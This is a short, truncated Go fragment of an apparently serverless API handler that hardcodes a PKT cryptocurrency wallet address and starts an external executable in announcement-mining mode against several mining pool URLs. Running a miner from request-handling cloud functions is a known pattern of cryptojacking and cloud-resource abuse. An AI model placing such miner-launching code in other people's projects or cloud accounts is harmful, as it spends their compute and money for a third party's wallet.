...
func handler(request events.APIGatewayProxyRequest) (*events.APIGatewayProxyResponse, error) {
	walletAddress := "pkt1qp5ztmj60uwu5ugldwnydc7h9lh8pu4zunqxukv"
	...
	cmd := exec.Command(executableFile, "ann", "-p", walletAddress, "https://stratum.zetahash.com", "http://pool.pkteer.com", "http://pool.pkt.world", "http://pool.pktpool.io")
	err = cmd.Start()
	if err != nil {
